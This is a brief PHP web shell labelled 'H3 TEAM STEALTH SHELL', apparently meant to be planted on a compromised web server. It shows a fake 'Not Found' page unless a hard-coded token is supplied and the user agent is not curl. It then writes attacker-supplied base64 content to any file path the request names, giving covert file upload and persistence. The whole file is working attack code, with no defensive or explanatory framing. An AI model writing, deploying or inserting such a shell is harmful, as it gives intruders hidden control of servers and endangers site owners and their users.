<?php
// H3 TEAM STEALTH SHELL
error_reporting(0);
$access_token = 'h3team';
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

if ($_GET['token'] !== $access_token || stripos($ua, 'curl') !== false || strlen($ua) < 6) {
    http_response_code(404);
    die("<html><body><h1>Not Found</h1></body></html>");
}

if ($_GET['do'] === 'sync' && isset($_POST['page']) && isset($_POST['desc'])) {
    $file = $_POST['page'];
    $chunk = base64_decode($_POST['desc']);

    $folder = dirname($file);
    if (!is_dir($folder)) {
        @mkdir($folder, 0755, true); // 🔧 auto-create directory
    }

    file_put_contents($file, $chunk, FILE_APPEND);
    echo "CHUNK OK";
    exit;
}
?>
